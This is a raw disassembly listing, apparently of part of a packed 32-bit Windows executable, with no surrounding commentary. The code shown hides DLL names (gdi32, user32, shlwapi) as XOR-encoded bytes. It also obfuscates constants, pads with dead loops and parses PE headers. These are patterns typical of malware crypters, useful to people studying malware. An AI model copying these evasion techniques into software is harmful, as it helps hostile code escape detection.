  423ec9:	jbe    0x423e9f
  423ecb:	out    0x83,eax
  423ecd:	leave  
  423ece:	or     ebp,DWORD PTR [eax-0x44d5bb2e]
  423ed4:	pop    ebp
  423ed5:	xor    WORD PTR [ebp+0x72],cx
  423ed9:	outs   dx,BYTE PTR ds:[esi]
  423eda:	xor    dh,BYTE PTR [edi-0x2d09233a]
  423ee0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ee1:	out    0x58,eax
  423ee3:	ins    DWORD PTR es:[edi],dx
  423ee4:	sub    edi,DWORD PTR [edx+ebp*4]
  423ee7:	fwait
  423ee8:	xor    ebx,0x0
  423eeb:	mov    eax,ecx
  423eed:	add    eax,0xfabdbecf
  423ef2:	adc    edi,0xffffffff
  423ef5:	xor    eax,0x8a29a145
  423efa:	xor    edi,0x0
  423efd:	cmp    eax,esi
  423eff:	jne    0x421ae1
  423f05:	cmp    edi,ebx
  423f07:	jne    0x421ae1
  423f0d:	mov    eax,0xf89c85b8
  423f12:	pop    ebx
  423f13:	pop    edi
  423f14:	pop    esi
  423f15:	leave  
  423f16:	ret    0xc
  423f19:	push   ebp
  423f1a:	mov    ebp,esp
  423f1c:	push   ecx
  423f1d:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  423f24:	and    edx,ecx
  423f26:	mov    eax,DWORD PTR [ebp+0x8]
  423f29:	and    DWORD PTR ds:0x428e95,edi
  423f2f:	movsx  eax,BYTE PTR [eax]
  423f32:	sub    edx,ecx
  423f34:	mov    edx,0x3272f8
  423f39:	xor    ecx,ecx
  423f3b:	add    ecx,DWORD PTR ds:0x428e9d
  423f41:	and    DWORD PTR ds:0x428e71,ecx
  423f47:	sub    eax,edx
  423f49:	mov    ecx,0x75108b1
  423f4e:	sub    DWORD PTR ds:0x428e29,0x428e25
  423f58:	xor    eax,ecx
  423f5a:	cmp    eax,0xf89c85e4
  423f5f:	mov    DWORD PTR ds:0x428e9d,0x7b75
  423f69:	jne    0x423ff4
  423f6f:	and    DWORD PTR ds:0x428e25,0x0
  423f79:	mov    eax,ds:0x428e25
  423f7e:	inc    eax
  423f7f:	mov    ds:0x428e25,eax
  423f84:	cmp    DWORD PTR ds:0x428e25,0x6
  423f8b:	jbe    0x423fcb
  423f91:	jmp    0x423fa6
  423f96:	push   0x42804e
  423f9b:	push   DWORD PTR [ebp-0xc]
  423f9e:	push   0x0
  423fa0:	call   DWORD PTR ds:0x42ca4c
  423fa6:	cmp    DWORD PTR ds:0x428e25,0x5
  423fad:	jne    0x423fbe
  423fb3:	mov    eax,ds:0x428e25
  423fb8:	inc    eax
  423fb9:	mov    ds:0x428e25,eax
  423fbe:	cmp    DWORD PTR ds:0x428e25,0x1a
  423fc5:	jb     0x423f79
  423fcb:	mov    eax,DWORD PTR [ebp+0x8]
  423fce:	push   esi
  423fcf:	mov    esi,DWORD PTR [ebp+0x8]
  423fd2:	add    esi,DWORD PTR [eax+0x3c]
  423fd5:	mov    DWORD PTR [ebp+0x8],esi
  423fd8:	mov    eax,DWORD PTR [ebp-0x4]
  423fdb:	mov    esi,DWORD PTR [ebp+0x8]
  423fde:	xor    eax,ecx
  423fe0:	add    eax,edx
  423fe2:	cmp    DWORD PTR [esi+0x54],eax
  423fe5:	pop    esi
  423fe6:	je     0x423ff4
  423fec:	mov    eax,DWORD PTR [ebp+0x8]
  423fef:	jmp    0x423ffb
  423ff4:	mov    eax,DWORD PTR [ebp-0x4]
  423ff7:	xor    eax,ecx
  423ff9:	add    eax,edx
  423ffb:	leave  
  423ffc:	ret    0x4
  423fff:	push   ebp
  424000:	mov    ebp,esp
  424002:	sub    esp,0xc
  424005:	adc    DWORD PTR ds:0x428e71,ebx
  42400b:	push   esi
  42400c:	or     ecx,0x44ac
  424012:	mov    eax,0xf89c85b9
  424017:	mov    DWORD PTR ds:0x428eb5,0x14
  424021:	cmp    DWORD PTR ds:0x428eb5,0x0
  424028:	je     0x42405d
  42402e:	cmp    DWORD PTR ds:0x428eb5,0x1d
  424035:	jb     0x42405d
  42403b:	jmp    0x424049
  424040:	push   DWORD PTR [ebp-0x24]
  424043:	call   DWORD PTR ds:0x42ca50
  424049:	xor    edx,edx
  42404b:	add    edx,DWORD PTR ds:0x428eb5
  424051:	dec    edx
  424052:	mov    DWORD PTR ds:0x428eb5,edx
  424058:	jmp    0x424021
  42405d:	mov    DWORD PTR [ebp-0x8],eax
  424060:	mov    DWORD PTR [ebp-0x4],0xf89c85b8
  424067:	and    DWORD PTR ds:0x428e65,0x0
  424071:	jmp    0x424083
  424076:	mov    ecx,DWORD PTR ds:0x428e65
  42407c:	inc    ecx
  42407d:	mov    DWORD PTR ds:0x428e65,ecx
  424083:	cmp    DWORD PTR ds:0x428e65,0x19
  42408a:	jae    0x4240c5
  424090:	cmp    DWORD PTR ds:0x428e65,0x1b
  424097:	jle    0x4240c5
  42409d:	jmp    0x4240c0
  4240a2:	push   DWORD PTR [ebp-0xc]
  4240a5:	push   0x1fe6
  4240aa:	push   DWORD PTR [ebp-0x1c]
  4240ad:	push   DWORD PTR [ebp-0xc]
  4240b0:	push   0x428124
  4240b5:	push   0x1d19
  4240ba:	call   DWORD PTR ds:0x42ca10
  4240c0:	jmp    0x424076
  4240c5:	mov    esi,DWORD PTR [ebp-0x4]
  4240c8:	xor    DWORD PTR ds:0x428e35,0x687d
  4240d2:	push   edi
  4240d3:	mov    DWORD PTR ds:0x428e8d,0x1d
  4240dd:	cmp    DWORD PTR ds:0x428e8d,0x0
  4240e4:	je     0x42412b
  4240ea:	cmp    DWORD PTR ds:0x428e8d,0x26
  4240f1:	ja     0x42412b
  4240f7:	jmp    0x424119
  4240fc:	push   0x4877
  424101:	push   0x5dd2
  424106:	push   0x3bfb
  42410b:	push   DWORD PTR [ebp-0x24]
  42410e:	push   0x428e91
  424113:	call   DWORD PTR ds:0x42ca14
  424119:	mov    ecx,DWORD PTR ds:0x428e8d
  42411f:	dec    ecx
  424120:	mov    DWORD PTR ds:0x428e8d,ecx
  424126:	jmp    0x4240dd
  42412b:	mov    edi,DWORD PTR [ebp-0x8]
  42412e:	mov    ecx,0x75108b1
  424133:	xor    esi,ecx
  424135:	xor    edi,ecx
  424137:	mov    edx,0x3272f8
  42413c:	add    edi,edx
  42413e:	add    esi,edx
  424140:	imul   esi,edi
  424143:	mov    edi,DWORD PTR [ebp+0xc]
  424146:	cmp    edi,esi
  424148:	je     0x42419d
  42414e:	mov    DWORD PTR [ebp-0xc],eax
  424151:	mov    eax,DWORD PTR [ebp-0xc]
  424154:	mov    esi,DWORD PTR [ebp+0xc]
  424157:	xor    eax,ecx
  424159:	lea    eax,[eax*8+0x1939838]
  424160:	mov    eax,DWORD PTR [esi+eax*1]
  424163:	mov    DWORD PTR [ebp+0xc],eax
  424166:	mov    eax,DWORD PTR [ebp-0x4]
  424169:	mov    esi,DWORD PTR [ebp-0x8]
  42416c:	xor    eax,ecx
  42416e:	xor    esi,ecx
  424170:	add    esi,edx
  424172:	add    eax,edx
  424174:	imul   eax,esi
  424177:	mov    esi,DWORD PTR [ebp+0xc]
  42417a:	cmp    esi,eax
  42417c:	je     0x42419d
  424182:	mov    eax,DWORD PTR [ebp-0x4]
  424185:	xor    eax,ecx
  424187:	mov    ecx,DWORD PTR [ebp+0xc]
  42418a:	add    eax,edx
  42418c:	imul   eax,ecx
  42418f:	add    eax,DWORD PTR [ebp+0x8]
  424192:	mov    DWORD PTR [ebp+0xc],eax
  424195:	mov    eax,DWORD PTR [ebp+0xc]
  424198:	jmp    0x4241ae
  42419d:	mov    eax,DWORD PTR [ebp-0x4]
  4241a0:	mov    esi,DWORD PTR [ebp-0x8]
  4241a3:	xor    esi,ecx
  4241a5:	xor    eax,ecx
  4241a7:	add    esi,edx
  4241a9:	add    eax,edx
  4241ab:	imul   eax,esi
  4241ae:	pop    edi
  4241af:	pop    esi
  4241b0:	leave  
  4241b1:	ret    0x8
	...
  4241c4:	iret   
  4241c5:	lods   eax,DWORD PTR ds:[esi]
  4241c6:	mov    ecx,DWORD PTR [ebp+0x0]
  4241c9:	add    BYTE PTR [eax],al
  4241cb:	add    BYTE PTR [edx],al
  4241cd:	add    BYTE PTR [eax],al
  4241cf:	add    BYTE PTR [ecx+0x0],al
  4241d2:	add    BYTE PTR [eax],al
  4241d4:	loopne 0x424217
  4241d6:	add    al,BYTE PTR [eax]
  4241d8:	loopne 0x42420f
  4241da:	add    al,BYTE PTR [eax]
  4241dc:	add    BYTE PTR [eax],al
  4241de:	add    BYTE PTR [eax],al
  4241e0:	push   edx
  4241e1:	push   ebx
  4241e2:	inc    esp
  4241e3:	push   ebx
  4241e4:	out    0x7e,al
  4241e6:	icebp  
  4241e7:	sti    
  4241e8:	mov    eax,0xbf489b03
  4241ed:	call   0x6ddc3300
  4241f2:	ins    DWORD PTR es:[edi],dx
  4241f3:	aas    
  4241f4:	add    DWORD PTR [eax],eax
  4241f6:	add    BYTE PTR [eax],al
  4241f8:	inc    ebx
  4241f9:	cmp    bl,BYTE PTR [esi+eax*2+0x6f]
  4241fd:	ins    BYTE PTR es:[edi],dx
  4241fe:	fs gs jb 0x424222
  424202:	outs   dx,DWORD PTR ds:[esi]
  424203:	data16 and BYTE PTR [edi+0x6f],dl
  424207:	jb     0x424274
  424209:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  424210:	push   0x65
  424212:	arpl   WORD PTR [esp+ebx*2+0x50],si
  424216:	jb     0x424287
  424218:	push   0x65
  42421a:	arpl   WORD PTR [esp+edx*2+0x65],si
  42421e:	jae    0x424294
  424220:	add    BYTE PTR [ebx-0x137e13ab],cl
  424226:	or     BYTE PTR [ecx],al
  424228:	add    BYTE PTR [eax],al
  42422a:	push   ebx
  42422b:	mov    eax,ebx
  42422d:	xchg   ecx,eax
  42422e:	mov    eax,DWORD PTR [ebp+0x8]
  424231:	cmp    eax,0xf89c85b9
  424236:	jne    0x4246ce
  42423c:	mov    eax,DWORD PTR [ebp+0xc]
  42423f:	cmp    eax,0xf89c85b8
  424244:	jne    0x4246ce
  42424a:	mov    eax,DWORD PTR [ebp+0x24]
  42424d:	mov    DWORD PTR [ebp-0x4],eax
  424250:	mov    eax,DWORD PTR [ebp-0x4]
  424253:	mov    eax,DWORD PTR [eax+0x1d8]
  424259:	mov    eax,DWORD PTR [eax]
  42425b:	mov    eax,DWORD PTR [eax]
  42425d:	mov    DWORD PTR [ebp-0x8],eax
  424260:	mov    BYTE PTR [ebp-0x18],0xe2
  424264:	mov    BYTE PTR [ebp-0x17],0xdf
  424268:	mov    BYTE PTR [ebp-0x16],0xe4
  42426c:	mov    BYTE PTR [ebp-0x15],0xae
  424270:	mov    BYTE PTR [ebp-0x14],0xad
  424274:	mov    BYTE PTR [ebp-0x13],0x7b
  424278:	mov    BYTE PTR [ebp-0x20],0xf0
  42427c:	mov    BYTE PTR [ebp-0x1f],0xee
  424280:	mov    BYTE PTR [ebp-0x1e],0xe0
  424284:	mov    BYTE PTR [ebp-0x1d],0xed
  424288:	mov    BYTE PTR [ebp-0x1c],0xae
  42428c:	mov    BYTE PTR [ebp-0x1b],0xad
  424290:	mov    BYTE PTR [ebp-0x1a],0x7b
  424294:	mov    BYTE PTR [ebp-0x28],0xee
  424298:	mov    BYTE PTR [ebp-0x27],0xe3
  42429c:	mov    BYTE PTR [ebp-0x26],0xe7
  4242a0:	mov    BYTE PTR [ebp-0x25],0xf2
  4242a4:	mov    BYTE PTR [ebp-0x24],0xdc
  4242a8:	mov    BYTE PTR [ebp-0x23],0xeb
  4242ac:	mov    BYTE PTR [ebp-0x22],0xe4
  4242b0:	mov    BYTE PTR [ebp-0x21],0x7b
  4242b4:	xor    ecx,ecx
  4242b6:	lea    eax,[ebp+ecx*1-0x18]
  4242ba:	movzx  edx,BYTE PTR [eax]
  4242bd:	xor    edx,0x80
  4242c3:	add    edx,0x5
  4242c6:	inc    ecx
  4242c7:	mov    BYTE PTR [eax],dl
  4242c9:	cmp    ecx,0x6
  4242cc:	jb     0x4242b6
  4242ce:	xor    ecx,ecx
  4242d0:	lea    eax,[ebp+ecx*1-0x20]
  4242d4:	movzx  edx,BYTE PTR [eax]
  4242d7:	xor    edx,0x80
  4242dd:	add    edx,0x5
  4242e0:	inc    ecx
  4242e1:	mov    BYTE PTR [eax],dl
  4242e3:	cmp    ecx,0x7
  4242e6:	jb     0x4242d0
  4242e8:	xor    ecx,ecx
  4242ea:	lea    eax,[ebp+ecx*1-0x28]
  4242ee:	movzx  edx,BYTE PTR [eax]
  4242f1:	xor    edx,0x80
  4242f7:	add    edx,0x5
  4242fa:	inc    ecx
  4242fb:	mov    BYTE PTR [eax],dl
  4242fd:	cmp    ecx,0x8
  424300:	jb     0x4242ea
  424302:	lea    eax,[ebp-0x2c]
  424305:	mov    DWORD PTR [ebp-0x8],eax
  424308:	mov    ecx,DWORD PTR [ebp-0x8]
  42430b:	mov    eax,0x7113fcef
  424310:	push   esi
  424311:	mov    DWORD PTR [ecx],eax
  424313:	mov    ecx,DWORD PTR [ebp-0x2c]
  424316:	mov    esi,0x4e3e
  42431b:	push   edi
  42431c:	lea    edi,[esi-0xa]
  42431f:	mov    ebx,0x3272f8
  424324:	cmp    ecx,eax
  424326:	jne    0x4243f7
  42432c:	lea    eax,[esi+0x39]
  42432f:	mov    WORD PTR [ebp-0x78],ax
  424333:	mov    eax,esi
  424335:	mov    WORD PTR [ebp-0x76],ax
  424339:	add    eax,0x3b
  42433c:	mov    WORD PTR [ebp-0x74],ax
  424340:	lea    eax,[esi-0x6]
  424343:	mov    WORD PTR [ebp-0x72],ax
  424347:	add    eax,0x47
  42434a:	mov    WORD PTR [ebp-0x70],ax
  42434e:	mov    eax,edi
  424350:	mov    WORD PTR [ebp-0x6e],ax
  424354:	mov    eax,0x4f92
  424359:	mov    WORD PTR [ebp-0x6c],ax
  42435d:	lea    eax,[esi-0x9]
  424360:	mov    WORD PTR [ebp-0x6a],ax
  424364:	add    eax,0x30
  424367:	mov    WORD PTR [ebp-0x68],ax
  42436b:	lea    eax,[esi-0xd]
  42436e:	mov    WORD PTR [ebp-0x66],ax
  424372:	mov    eax,esi
  424374:	mov    WORD PTR [ebp-0x64],ax
  424378:	add    eax,0xfffffff4
  42437b:	mov    WORD PTR [ebp-0x62],ax
  42437f:	mov    eax,0x44b
  424384:	mov    WORD PTR [ebp-0x60],ax
  424388:	mov    eax,0x5674
  42438d:	mov    WORD PTR [ebp-0x5e],ax
  424391:	mov    eax,0x6114
  424396:	mov    WORD PTR [ebp-0x5c],ax
  42439a:	mov    eax,0xf1e6
  42439f:	mov    WORD PTR [ebp-0x5a],ax
  4243a3:	mov    eax,edi
  4243a5:	mov    WORD PTR [ebp-0x58],ax
  4243a9:	lea    eax,[ebp-0xe0]
  4243af:	push   eax
  4243b0:	mov    eax,DWORD PTR [ebp+0xc]
  4243b3:	xor    eax,0x75108b1
  4243b8:	add    eax,ebx
  4243ba:	push   eax
  4243bb:	lea    eax,[ebp-0x78]
  4243be:	push   eax
  4243bf:	mov    eax,DWORD PTR [ebp-0x4]
  4243c2:	mov    eax,DWORD PTR [eax+0x198]
  4243c8:	mov    DWORD PTR [ebp-0xe0],0x1
  4243d2:	mov    DWORD PTR [ebp-0xdc],0xffff
  4243dc:	push   DWORD PTR [eax]
  4243de:	mov    eax,DWORD PTR [ebp+0x10]
  4243e1:	call   eax
  4243e3:	mov    DWORD PTR [ebp-0x8],eax
  4243e6:	mov    eax,DWORD PTR [ebp-0x8]
  4243e9:	test   eax,eax
  4243eb:	je     0x4243f7
  4243ed:	xor    DWORD PTR ds:0xe041cdd,0x9f170bcc
  4243f7:	mov    eax,DWORD PTR [ebp-0x4]
  4243fa:	mov    ecx,DWORD PTR [eax+0x18c]
  424400:	xor    eax,eax
  424402:	cmp    DWORD PTR [ecx],eax
  424404:	jne    0x42463e
  42440a:	mov    ecx,DWORD PTR [ebp-0x4]
  42440d:	mov    ecx,DWORD PTR [ecx+0x17c]
  424413:	mov    DWORD PTR [ecx],eax
  424415:	mov    ecx,DWORD PTR [ebp-0x4]
  424418:	mov    ecx,DWORD PTR [ecx+0x180]
  42441e:	mov    DWORD PTR [ecx],eax
  424420:	mov    eax,0x4e69
  424425:	mov    WORD PTR [ebp-0x9c],ax
  42442c:	mov    eax,esi
  42442e:	mov    WORD PTR [ebp-0x9a],ax
  424435:	mov    eax,0x4e79
  42443a:	mov    WORD PTR [ebp-0x98],ax
  424441:	add    eax,0xffffffc0
  424444:	mov    WORD PTR [ebp-0x96],ax
  42444b:	mov    eax,0x4f8e
  424450:	mov    WORD PTR [ebp-0x94],ax
  424457:	mov    eax,0x4e3a
  42445c:	mov    WORD PTR [ebp-0x92],ax
  424463:	mov    eax,esi
  424465:	mov    WORD PTR [ebp-0x8c],ax
  42446c:	mov    eax,0x4e35
  424471:	mov    WORD PTR [ebp-0x8a],ax
  424478:	mov    eax,0x99f9
  42447d:	mov    WORD PTR [ebp-0x88],ax
  424484:	mov    eax,0x8d6a
  424489:	mov    WORD PTR [ebp-0x86],ax
  424490:	mov    eax,0xd66f
  424495:	mov    WORD PTR [ebp-0x84],ax
  42449c:	mov    BYTE PTR [ebp-0x10],0xee
  4244a0:	mov    eax,0xd78b
  4244a5:	mov    WORD PTR [ebp-0x82],ax
  4244ac:	mov    BYTE PTR [ebp-0xf],0xe3
  4244b0:	mov    eax,0x2784
  4244b5:	mov    BYTE PTR [ebp-0xe],0xe7
  4244b9:	mov    WORD PTR [ebp-0x80],ax
  4244bd:	mov    BYTE PTR [ebp-0xd],0xf2
  4244c1:	mov    eax,0x4784
  4244c6:	mov    BYTE PTR [ebp-0xc],0xdc
  4244ca:	mov    WORD PTR [ebp-0x7e],ax
  4244ce:	mov    eax,0x4e3b
  4244d3:	mov    BYTE PTR [ebp-0xb],0xeb
  4244d7:	push   0x8
  4244d9:	mov    BYTE PTR [ebp-0xa],0xe4
  4244dd:	mov    WORD PTR [ebp-0x7c],ax
  4244e1:	mov    BYTE PTR [ebp-0x9],0x7b
  4244e5:	mov    DWORD PTR [ebp-0x90],0x4e344e65
  4244ef:	lea    eax,[ebp-0x10]
  4244f2:	pop    edi
  4244f3:	movzx  ecx,BYTE PTR [eax]
  4244f6:	xor    ecx,0x80
  4244fc:	add    ecx,0x5
  4244ff:	mov    BYTE PTR [eax],cl
  424501:	inc    eax
  424502:	dec    edi
  424503:	jne    0x4244f3
  424505:	mov    DWORD PTR [ebp-0xe0],0x1
  42450f:	lea    eax,[ebp-0x10]
  424512:	mov    DWORD PTR [ebp-0xdc],eax
  424518:	mov    ecx,0x4e66
  42451d:	mov    eax,ecx
  42451f:	mov    WORD PTR [ebp-0x40],ax
  424523:	add    eax,0xd
  424526:	mov    edx,eax
  424528:	mov    WORD PTR [ebp-0x3e],dx
  42452c:	mov    edx,0x4f9b
  424531:	mov    WORD PTR [ebp-0x3c],dx
  424535:	add    edx,0xfffffff8
  424538:	mov    WORD PTR [ebp-0x3a],dx
  42453c:	mov    edx,0x4f8d
  424541:	mov    WORD PTR [ebp-0x38],dx
  424545:	add    edx,0xfffffffb
  424548:	mov    WORD PTR [ebp-0x36],dx
  42454c:	mov    edx,0x4f87
  424551:	mov    WORD PTR [ebp-0x34],dx
  424555:	mov    WORD PTR [ebp-0x32],cx
  424559:	mov    ecx,esi
  42455b:	mov    WORD PTR [ebp-0x30],cx
  42455f:	lea    ecx,[edx-0x1]
  424562:	mov    edx,ecx
  424564:	mov    WORD PTR [ebp-0x54],dx
  424568:	mov    edx,eax
  42456a:	mov    WORD PTR [ebp-0x52],dx
  42456e:	mov    edx,0x4e7b
  424573:	mov    WORD PTR [ebp-0x50],dx
  424577:	mov    WORD PTR [ebp-0x4e],ax
  42457b:	lea    eax,[edx-0xe]
  42457e:	mov    WORD PTR [ebp-0x4c],ax
  424582:	add    eax,0xfffffffb
  424585:	mov    WORD PTR [ebp-0x4a],ax
  424589:	lea    eax,[edx-0x14]
  42458c:	mov    WORD PTR [ebp-0x48],ax
  424590:	mov    WORD PTR [ebp-0x46],cx
  424594:	mov    WORD PTR [ebp-0x44],si
  424598:	mov    ecx,DWORD PTR [ebp+0x8]
  42459b:	movzx  edx,WORD PTR [ebp-0x54]
  42459f:	mov    eax,0x75108b1
  4245a4:	xor    ecx,eax
  4245a6:	add    ecx,ebx
  4245a8:	xor    ecx,edx
  4245aa:	mov    WORD PTR [ebp-0x54],cx
  4245ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4245b1:	xor    ecx,eax
  4245b3:	movzx  eax,WORD PTR [ebp-0x40]
  4245b7:	add    ecx,ebx
  4245b9:	xor    ecx,eax
  4245bb:	xor    eax,eax
  4245bd:	mov    WORD PTR [ebp-0x40],cx
  4245c1:	mov    WORD PTR [ebp-0xf4],ax
  4245c8:	mov    WORD PTR [ebp-0x108],ax
  4245cf:	mov    edi,DWORD PTR [ebp+0x24]
  4245d2:	lea    eax,[ebp-0xf4]
  4245d8:	lea    edx,[ebp-0x54]
  4245db:	mov    DWORD PTR [ebp-0xe0],0x2
  4245e5:	mov    DWORD PTR [ebp-0xdc],eax
  4245eb:	call   0x42702b
  4245f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4245f3:	mov    DWORD PTR [ebp-0xd8],eax
  4245f9:	mov    eax,0x75108b1
  4245fe:	xor    ecx,eax
  424600:	add    ecx,ebx
  424602:	je     0x424621
  424604:	lea    ecx,[ebp-0xe0]
  42460a:	push   ecx
  42460b:	mov    ecx,DWORD PTR [ebp+0xc]
  42460e:	xor    ecx,eax
  424610:	add    ecx,ebx
  424612:	push   ecx
  424613:	lea    eax,[ebp-0x9c]
  424619:	push   eax
  42461a:	mov    eax,DWORD PTR [ebp+0x10]
  42461d:	push   0x0
  42461f:	call   eax
  424621:	mov    edi,DWORD PTR [ebp+0x24]
  424624:	lea    eax,[ebp-0x108]
  42462a:	lea    edx,[ebp-0x40]
  42462d:	mov    DWORD PTR [ebp-0xdc],eax
  424633:	call   0x42702b
  424638:	mov    DWORD PTR [ebp-0xd8],eax
  42463e:	mov    eax,DWORD PTR [ebp+0x14]
  424641:	push   DWORD PTR [ebp-0x4]
  424644:	push   DWORD PTR [ebp+0x20]
  424647:	push   DWORD PTR [ebp+0x1c]
  42464a:	push   DWORD PTR [ebp+0x18]
  42464d:	push   DWORD PTR [ebp+0x10]
  424650:	push   DWORD PTR [ebp+0x8]
  424653:	push   DWORD PTR [ebp+0xc]
  424656:	call   0x4258cc
  42465b:	test   eax,eax
  42465d:	je     0x4246a4
  42465f:	add    DWORD PTR [ebp-0x4],eax
  424662:	push   DWORD PTR [ebp-0x4]
  424665:	lea    esi,[ebp+0x4]
  424668:	call   0x424abc
  42466d:	mov    eax,DWORD PTR [ebp-0x4]
  424670:	mov    eax,DWORD PTR [eax+0x1c8]
  424676:	mov    eax,DWORD PTR [eax]
  424678:	xor    eax,0x75108b1
  42467d:	add    eax,ebx
  42467f:	mov    eax,DWORD PTR [ebp-0x4]
  424682:	jne    0x42469a
  424684:	mov    ecx,DWORD PTR [ebp-0x4]
  424687:	mov    ecx,DWORD PTR [ecx+0x1cc]
  42468d:	push   DWORD PTR [ecx]
  42468f:	mov    eax,DWORD PTR [eax+0x1e0]
  424695:	call   DWORD PTR [eax+0x28]
  424698:	jmp    0x4246a4
  42469a:	mov    eax,DWORD PTR [eax+0x17c]
  4246a0:	mov    eax,DWORD PTR [eax]
  4246a2:	add    DWORD PTR [esi],eax
  4246a4:	mov    eax,DWORD PTR [ebp-0x4]
  4246a7:	mov    eax,DWORD PTR [eax+0x1dc]
  4246ad:	dec    DWORD PTR [eax]
  4246af:	mov    ecx,DWORD PTR [ebp-0x4]
  4246b2:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4246b8:	mov    eax,DWORD PTR [eax]
  4246ba:	lea    eax,[ecx+eax*4]
  4246bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4246c0:	mov    ecx,DWORD PTR [ecx+0x17c]
  4246c6:	mov    eax,DWORD PTR [eax]
  4246c8:	mov    ecx,DWORD PTR [ecx]
  4246ca:	add    DWORD PTR [eax],ecx
  4246cc:	pop    edi
  4246cd:	pop    esi
  4246ce:	pop    ebx
  4246cf:	leave  
  4246d0:	ret    0x20
  4246d3:	push   edi
  4246d4:	push   esi
  4246d5:	push   ebx
  4246d6:	push   ebp
  4246d7:	mov    ebp,esp
  4246d9:	mov    eax,DWORD PTR [ebp+0x24]
  4246dc:	add    DWORD PTR [ebp+0x28],eax
  4246df:	push   eax
  4246e0:	cld    
  4246e1:	mov    esi,DWORD PTR [ebp+0x18]
  4246e4:	add    DWORD PTR [ebp+0x1c],esi
  4246e7:	push   esi
  4246e8:	mov    esi,DWORD PTR [ebp+0x14]
  4246eb:	lods   eax,DWORD PTR ds:[esi]
  4246ec:	xchg   edx,eax
  4246ed:	push   edx
  4246ee:	mov    cl,BYTE PTR [esi-0x2]
  4246f1:	or     eax,0xffffffff
  4246f4:	shl    eax,cl
  4246f6:	not    eax
  4246f8:	push   eax
  4246f9:	mov    cl,dh
  4246fb:	or     eax,0xffffffff
  4246fe:	shl    eax,cl
  424700:	not    eax
  424702:	push   eax
  424703:	add    cl,dl
  424705:	mov    edi,esi
  424707:	sub    esp,0xc
  42470a:	sub    eax,eax
  42470c:	inc    eax
  42470d:	push   eax
  42470e:	push   eax
  42470f:	push   eax
  424710:	push   eax
  424711:	push   eax
  424712:	push   edi
  424713:	sub    esi,esi
  424715:	push   esi
  424716:	or     ebx,0xffffffff
  424719:	mov    eax,0x300
  42471e:	shl    eax,cl
  424720:	lea    ecx,[eax+0x736]
  424726:	mov    eax,0x4000400
  42472b:	shr    ecx,1
  42472d:	rep stos DWORD PTR es:[edi],eax
  42472f:	push   0x5
  424731:	pop    ecx
  424732:	call   0x424a1d
  424737:	loop   0x424732
  424739:	lea    esi,[esi]
  42473b:	lea    edi,[edi]
  42473d:	mov    edi,DWORD PTR [ebp-0x4]
  424740:	mov    eax,DWORD PTR [ebp-0x10]
  424743:	sub    edi,DWORD PTR [ebp+0x24]
  424746:	and    eax,edi
  424748:	mov    DWORD PTR [ebp-0x18],eax
  42474b:	mov    al,0x0
  42474d:	call   0x424a35
  424752:	jne    0x4247ed
  424758:	mov    cl,BYTE PTR [ebp-0xc]
  42475b:	and    edi,DWORD PTR [ebp-0x14]
  42475e:	shl    edi,cl
  424760:	sub    cl,0x8
  424763:	neg    cl
  424765:	shr    esi,cl
  424767:	pop    eax
  424768:	add    edi,esi
  42476a:	pop    esi
  42476b:	lea    edi,[edi+edi*2]
  42476e:	shl    edi,0x8
  424771:	cmp    al,0x7
  424773:	pop    edx
  424774:	lea    ecx,[esi+edi*2+0xe6c]
  42477b:	push   ecx
  42477c:	push   esi
  42477d:	mov    esi,0x100
  424782:	push   eax
  424783:	mov    al,0x1
  424785:	jb     0x4247bb
  424787:	mov    edi,DWORD PTR [ebp-0x4]
  42478a:	sub    edi,DWORD PTR [ebp-0x24]
  42478d:	movzx  edi,BYTE PTR [edi]
  424790:	mov    ebp,DWORD PTR [ebp-0x34]
  424793:	shl    edi,1
  424795:	mov    ecx,esi
  424797:	and    esi,edi
  424799:	add    ecx,esi
  42479b:	lea    ebp,[ebp+ecx*2+0x0]
  42479f:	call   0x424a54
  4247a4:	mov    ecx,eax
  4247a6:	shr    esi,0x8
  4247a9:	and    ecx,0x1
  4247ac:	cmp    esi,ecx
  4247ae:	mov    esi,0x100
  4247b3:	jne    0x4247c3
  4247b5:	cmp    eax,esi
  4247b7:	jb     0x424790
  4247b9:	jmp    0x4247cf
  4247bb:	mov    ebp,DWORD PTR [ebp-0x34]
  4247be:	call   0x424a54
  4247c3:	inc    eax
  4247c4:	inc    esi
  4247c5:	sub    eax,0x1
  4247c8:	sub    esi,0x1
  4247cb:	cmp    eax,esi
  4247cd:	jb     0x4247bb
  4247cf:	pop    edx
  4247d0:	inc    edx
  4247d1:	cmp    edx,0x5
  4247d4:	dec    edx
  4247d5:	mov    ecx,edx
  4247d7:	jb     0x4247e8
  4247d9:	inc    edx
  4247da:	cmp    edx,0xb
  4247dd:	dec    edx
  4247de:	mov    cl,0x4
  4247e0:	dec    cl
  4247e2:	jb     0x4247e8
  4247e4:	mov    cl,0x7
  4247e6:	dec    cl
  4247e8:	sub    edx,ecx
  4247ea:	push   edx
  4247eb:	jmp    0x42483c
  4247ed:	mov    al,0xc1
  4247ef:	dec    al
  4247f1:	call   0x424a45
  4247f6:	jne    0x42480c
  4247f8:	pop    eax
  4247f9:	pop    edi
  4247fa:	pop    edx
  4247fb:	pop    ecx
  4247fc:	pop    edx
  4247fd:	pop    ecx
  4247fe:	push   DWORD PTR [esp]
  424801:	push   ecx
  424802:	push   edx
  424803:	mov    edx,0x664
  424808:	mov    cl,0x0
  42480a:	jmp    0x42487f
  42480c:	mov    al,0xcd
  42480e:	dec    al
  424810:	call   0x424a45
  424815:	jne    0x424845
  424817:	mov    al,0xf1
  424819:	dec    al
  42481b:	call   0x424a35
  424820:	jne    0x424875
  424822:	pop    eax
  424823:	cmp    al,0x7
  424825:	mov    al,0x9
  424827:	jb     0x42482b
  424829:	mov    al,0xb
  42482b:	push   eax
  42482c:	mov    esi,DWORD PTR [ebp-0x4]
  42482f:	sub    esi,DWORD PTR [ebp-0x24]
  424832:	cmp    esi,DWORD PTR [ebp+0x24]
  424835:	jb     0x424a0c
  42483b:	lods   al,BYTE PTR ds:[esi]
  42483c:	mov    edi,DWORD PTR [ebp-0x4]
  42483f:	stos   BYTE PTR es:[edi],al
  424840:	jmp    0x4249d3
  424845:	mov    al,0xd8
  424847:	call   0x424a45
  42484c:	mov    esi,DWORD PTR [ebp-0x28]
  42484f:	je     0x42486c
  424851:	mov    al,0xe4
